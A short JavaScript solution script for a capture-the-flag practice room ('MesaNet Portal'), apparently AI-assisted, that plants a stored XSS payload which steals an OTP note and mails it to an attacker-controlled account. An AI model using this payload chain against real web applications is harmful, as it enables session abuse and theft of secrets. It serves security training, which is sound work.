// script by Gemini and Claudi
// script for Bugforge room MesaNet Portal https://app.bugforge.io/
// YouTube video walk through: https://youtu.be/9OjUF6yl54o

fetch('/gateway', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    id: 'f7d4e8b2-3a1c-4f9e-8b2d-1c5e7a9f3b6d', // Trigger the bot via Rail App
    endpoint: '/api/rail/create',
    data: {
      type: 'announcement',
      timestamp: '13:37:00',
      priority: 'high',
      message: `pwned<img src=x onerror="
        fetch('/gateway', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            id: 'a7f3c4e9-8b2d-4a6f-9c1e-5d8a3b7f2c4e', 
            endpoint: '/api/notes/get', 
            data: { id: 6 } // Steal the OTP note
          })
        })
        .then(res => res.text())
        .then(stolenSecret => 
          fetch('/gateway', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              id: 'b3e8d1f6-4c9a-4b2e-8f7d-6a1c9b3e5f8d', // Exfiltrate via Mail App
              endpoint: '/api/mail/send', 
              data: { 
                toUsername: 'operator', 
                subject: 'OTP Captured', 
                body: stolenSecret, 
                classification: 'public' 
              }
            })
          })
        )
      ">`
    }
  })
})
.then(response => response.json())
.then(console.log);
